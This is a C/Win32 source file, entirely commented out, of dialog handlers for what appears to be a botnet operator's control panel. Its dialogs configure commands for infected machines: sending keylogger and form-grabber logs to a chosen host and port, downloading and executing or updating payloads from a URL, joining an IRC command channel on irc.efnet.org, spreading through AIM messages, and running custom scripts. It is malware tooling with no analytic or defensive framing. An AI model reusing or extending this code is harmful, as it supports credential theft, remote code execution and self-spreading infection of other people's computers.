#include <winsock2.h>
#include "messagedialogs.h"

extern Connection Connection;
/*
BOOL CALLBACK SendLogProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam){
	if(Msg == WM_INITDIALOG){
		HWND hWndHost = GetDlgItem(hWnd, IDC_HOST);
		HWND hWndPort = GetDlgItem(hWnd, IDC_PORT);
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(!Reg.Exists(REG_SENDLOGHOST))
			Reg.SetString(REG_SENDLOGHOST, "127.0.0.1");
		if(!Reg.Exists(REG_SENDLOGPORT))
			Reg.SetInt(REG_SENDLOGPORT, 51009);
		if(!Reg.Exists(REG_SENDLOGFLAGS))
			Reg.SetInt(REG_SENDLOGFLAGS, 3);
		SetWindowText(hWndHost, Reg.GetString(REG_SENDLOGHOST));
		DWORD Port = Reg.GetInt(REG_SENDLOGPORT);
		if(Port > 0){
			CHAR Temp[16];
			SetWindowText(hWndPort, itoa(Port, Temp, 10));
		}
		DWORD Flags = Reg.GetInt(REG_SENDLOGFLAGS);
		if(Flags & 1)
			CheckDlgButton(hWnd, IDC_KEYLOG, BST_CHECKED);
		if(Flags & 2)
			CheckDlgButton(hWnd, IDC_FORMLOG, BST_CHECKED);
		SetFocus(GetDlgItem(hWnd, IDC_HOST));
		EnableWindow(hWnd, TRUE);
	}else
	if(Msg == WM_CLOSE){
		EndDialog(hWnd, FALSE);
	}else
	if(Msg == WM_COMMAND){
		if(HIWORD(wParam) == BN_CLICKED){
			if(LOWORD(wParam) == IDCANCEL){
				EndDialog(hWnd, FALSE);
			}else if(LOWORD(wParam) == IDOK){
				cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
				CHAR Temp[128];
				GetWindowText(GetDlgItem(hWnd, IDC_HOST), Temp, sizeof(Temp));
				Reg.SetString(REG_SENDLOGHOST, Temp);
				GetWindowText(GetDlgItem(hWnd, IDC_PORT), Temp, sizeof(Temp));
				Reg.SetInt(REG_SENDLOGPORT, atoi(Temp));
				DWORD Flags = 0;
				Flags |= IsDlgButtonChecked(hWnd, IDC_KEYLOG);
				Flags |= (IsDlgButtonChecked(hWnd, IDC_FORMLOG) << 1);
				Reg.SetInt(REG_SENDLOGFLAGS, Flags);
				sprintf(messagequeue::Params, "%d,%s,%d", Flags, Reg.GetString(REG_SENDLOGHOST), Reg.GetInt(REG_SENDLOGPORT));
				sprintf(messagequeue::Comments, "%s:%d", Reg.GetString(REG_SENDLOGHOST), Reg.GetInt(REG_SENDLOGPORT));
				EndDialog(hWnd, TRUE);
			}
		}
	}
	return 0;
}

BOOL CALLBACK HTTPDownloadProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam){
	if(Msg == WM_INITDIALOG){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(!Reg.Exists(REG_HTTPDURL))
			Reg.SetString(REG_HTTPDURL, "http://");
		if(!Reg.Exists(REG_HTTPDFILE))
			Reg.SetString(REG_HTTPDFILE, "temp");
		if(!Reg.Exists(REG_HTTPDUPDATE))
			Reg.SetInt(REG_HTTPDUPDATE, 0);
		if(!Reg.Exists(REG_HTTPDEXECUTE))
			Reg.SetInt(REG_HTTPDEXECUTE, 0);
		SetWindowText(GetDlgItem(hWnd, IDC_URL), Reg.GetString(REG_HTTPDURL));
		SetWindowText(GetDlgItem(hWnd, IDC_FILE), Reg.GetString(REG_HTTPDFILE));
		CheckDlgButton(hWnd, IDC_UPDATE, Reg.GetInt(REG_HTTPDUPDATE) ? BST_CHECKED : BST_UNCHECKED);
		CheckDlgButton(hWnd, IDC_EXECUTE, Reg.GetInt(REG_HTTPDEXECUTE) ? BST_CHECKED : BST_UNCHECKED);
		if(Reg.GetInt(REG_HTTPDEXECUTE)){
			EnableWindow(GetDlgItem(hWnd, IDC_FILE), FALSE);
			EnableWindow(GetDlgItem(hWnd, IDC_UPDATE), TRUE);
		}else{
			EnableWindow(GetDlgItem(hWnd, IDC_UPDATE), FALSE);
		}
		SetFocus(GetDlgItem(hWnd, IDC_HOST));
		EnableWindow(hWnd, TRUE);
	}else
	if(Msg == WM_CLOSE){
		EndDialog(hWnd, FALSE);
	}else
	if(Msg == WM_COMMAND){
		if(HIWORD(wParam) == BN_CLICKED){
			if(LOWORD(wParam) == IDC_EXECUTE){
				if(IsDlgButtonChecked(hWnd, IDC_EXECUTE) == BST_CHECKED){
					EnableWindow(GetDlgItem(hWnd, IDC_FILE), FALSE);
					EnableWindow(GetDlgItem(hWnd, IDC_UPDATE), TRUE);
				}else{
					EnableWindow(GetDlgItem(hWnd, IDC_FILE), TRUE);
					EnableWindow(GetDlgItem(hWnd, IDC_UPDATE), FALSE);
				}
			}else
			if(LOWORD(wParam) == IDCANCEL){
				EndDialog(hWnd, FALSE);
			}else
			if(LOWORD(wParam) == IDOK){
				cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
				CHAR Temp[256];
				GetWindowText(GetDlgItem(hWnd, IDC_URL), Temp, sizeof(Temp));
				Reg.SetString(REG_HTTPDURL, Temp);
				GetWindowText(GetDlgItem(hWnd, IDC_FILE), Temp, sizeof(Temp));
				Reg.SetString(REG_HTTPDFILE, Temp);
				Reg.SetInt(REG_HTTPDEXECUTE, IsDlgButtonChecked(hWnd, IDC_EXECUTE));
				Reg.SetInt(REG_HTTPDUPDATE, IsDlgButtonChecked(hWnd, IDC_UPDATE));
				DWORD Flags = Reg.GetInt(REG_HTTPDEXECUTE) ? Reg.GetInt(REG_HTTPDUPDATE) ? 2 : 1 : 0;
				sprintf(messagequeue::Params, "%s,%s,%d", Reg.GetString(REG_HTTPDURL), Reg.GetInt(REG_HTTPDEXECUTE) || Reg.GetInt(REG_HTTPDUPDATE) ? "temp" : Reg.GetString(REG_HTTPDURL), Flags);
				sprintf(messagequeue::Comments, "%s%s%s%s", Flags == 2 ? "Update: " : "", Reg.GetString(REG_HTTPDURL), !Flags ? " -> " : "", !Flags ? Temp : "");
				EndDialog(hWnd, TRUE);
			}
		}
	}
	return 0;
}

BOOL CALLBACK StartIRCBotProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam){
	if(Msg == WM_INITDIALOG){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(!Reg.Exists(REG_IRCHOST)){
			SetWindowText(GetDlgItem(hWnd, IDC_HOST), "irc.efnet.org");
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_HOST), Reg.GetString(REG_IRCHOST));
		}
		if(!Reg.Exists(REG_IRCPORT)){
			SetWindowText(GetDlgItem(hWnd, IDC_PORT), "6667");
		}else{
			CHAR Temp[18];
			SetWindowText(GetDlgItem(hWnd, IDC_PORT), itoa(Reg.GetInt(REG_IRCPORT), Temp, 10));
		}
		if(!Reg.Exists(REG_IRCNICK)){
			SetWindowText(GetDlgItem(hWnd, IDC_NICK), "SNU[####]");
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_NICK), Reg.GetString(REG_IRCNICK));
		}
		if(!Reg.Exists(REG_IRCIDENT)){
			SetWindowText(GetDlgItem(hWnd, IDC_IDENT), "none");
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_IDENT), Reg.GetString(REG_IRCIDENT));
		}
		if(!Reg.Exists(REG_IRCNAME)){
			SetWindowText(GetDlgItem(hWnd, IDC_NAME), "none");
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_NAME), Reg.GetString(REG_IRCNAME));
		}
		if(!Reg.Exists(REG_IRCCHANNEL)){
			SetWindowText(GetDlgItem(hWnd, IDC_CHANNEL), "#snu");
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_CHANNEL), Reg.GetString(REG_IRCCHANNEL));
		}
		if(!Reg.Exists(REG_IRCALLOWED)){
			SetWindowText(GetDlgItem(hWnd, IDC_ALLOWED), "*");
		}else{
			SetWindowText(GetDlgItem(hWnd, IDC_ALLOWED), Reg.GetString(REG_IRCALLOWED));
		}
		SetWindowPos(GetDlgItem(hWnd, IDC_HOST), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(GetDlgItem(hWnd, IDC_PORT), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(GetDlgItem(hWnd, IDC_NICK), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(GetDlgItem(hWnd, IDC_IDENT), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(GetDlgItem(hWnd, IDC_NAME), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(GetDlgItem(hWnd, IDC_CHANNEL), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(GetDlgItem(hWnd, IDC_ALLOWED), HWND_BOTTOM, NULL, NULL, NULL, NULL, SWP_NOMOVE | SWP_NOSIZE);
		SetFocus(GetDlgItem(hWnd, IDC_HOST));
		EnableWindow(hWnd, TRUE);
	}else
	if(Msg == WM_CLOSE){
		EndDialog(hWnd, FALSE);
	}else
	if(Msg == WM_COMMAND){
		if(HIWORD(wParam) == BN_CLICKED){
			if(LOWORD(wParam) == IDCANCEL){
				EndDialog(hWnd, FALSE);
			}else if(LOWORD(wParam) == IDOK){
				CHAR Host[256];
				CHAR Port[16];
				CHAR Channel[256];
				CHAR Nick[32];
				CHAR Ident[32];
				CHAR Name[32];
				CHAR Allowed[256];
				GetWindowText(GetDlgItem(hWnd, IDC_HOST), Host, sizeof(Host));
				GetWindowText(GetDlgItem(hWnd, IDC_PORT), Port, sizeof(Port));
				GetWindowText(GetDlgItem(hWnd, IDC_CHANNEL), Channel, sizeof(Channel));
				GetWindowText(GetDlgItem(hWnd, IDC_NICK), Nick, sizeof(Nick));
				GetWindowText(GetDlgItem(hWnd, IDC_IDENT), Ident, sizeof(Ident));
				GetWindowText(GetDlgItem(hWnd, IDC_NAME), Name, sizeof(Name));
				GetWindowText(GetDlgItem(hWnd, IDC_ALLOWED), Allowed, sizeof(Allowed));
				cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
				Reg.SetString(REG_IRCHOST, Host);
				Reg.SetInt(REG_IRCPORT, atoi(Port));
				Reg.SetString(REG_IRCCHANNEL, Channel);
				Reg.SetString(REG_IRCNICK, Nick);
				Reg.SetString(REG_IRCIDENT, Ident);
				Reg.SetString(REG_IRCNAME, Name);
				Reg.SetString(REG_IRCALLOWED, Allowed);
				sprintf(messagequeue::Params, "%s,%s,%s,%s,%s,%s,%s", Host, Port, Channel, Nick, Ident, Name, Allowed);
				sprintf(messagequeue::Comments, "%s %s (%s) [%s]", Host, Channel, Nick, Allowed);
				EndDialog(hWnd, TRUE);
			}
		}
	}
	return 0;
}

BOOL CALLBACK SpreadAIMProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam){
	if(Msg == WM_INITDIALOG){
		SetWindowText(GetDlgItem(hWnd, IDC_TIMESTOSEND), "5");
		EnableWindow(hWnd, TRUE);
	}else
	if(Msg == WM_CLOSE){
		EndDialog(hWnd, FALSE);
	}else
	if(Msg == WM_COMMAND){
		if(HIWORD(wParam) == BN_CLICKED){
			if(LOWORD(wParam) == IDCANCEL){
				EndDialog(hWnd, FALSE);
			}else if(LOWORD(wParam) == IDOK){
				CHAR TimesToSend[16];
				GetWindowText(GetDlgItem(hWnd, IDC_TIMESTOSEND), TimesToSend, sizeof(TimesToSend));
				sprintf(messagequeue::Params, "%d", atoi(TimesToSend));
				sprintf(messagequeue::Comments, "Send %d times", atoi(TimesToSend));
				EndDialog(hWnd, TRUE);
			}
		}
	}
	return 0;
}

BOOL CALLBACK CustomCommandProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam){
	if(Msg == WM_INITDIALOG){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(Reg.Exists(REG_CUSTOMCOMMAND)){
			SetWindowText(GetDlgItem(hWnd, IDC_CUSTOMCOMMAND), Reg.GetString(REG_CUSTOMCOMMAND));
		}
		SetFocus(GetDlgItem(hWnd, IDC_CUSTOMCOMMAND));
		EnableWindow(hWnd, TRUE);
	}else
	if(Msg == WM_CLOSE){
		EndDialog(hWnd, FALSE);
	}else
	if(Msg == WM_COMMAND){
		if(HIWORD(wParam) == BN_CLICKED){
			if(LOWORD(wParam) == IDCANCEL){
				EndDialog(hWnd, FALSE);
			}else if(LOWORD(wParam) == IDOK){
				CHAR CustomCommand[1024];
				GetWindowText(GetDlgItem(hWnd, IDC_CUSTOMCOMMAND), CustomCommand, sizeof(CustomCommand));
				//strncpy(messagequeue::Params, CustomCommand, 1024);
				//strncpy(messagequeue::Comments, CustomCommand, 256);
				strncpy(messagequeue::Script, CustomCommand, 1024);
				cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
				Reg.SetString(REG_CUSTOMCOMMAND, CustomCommand);
				EndDialog(hWnd, TRUE);
			}
		}
	}
	return 0;
}*/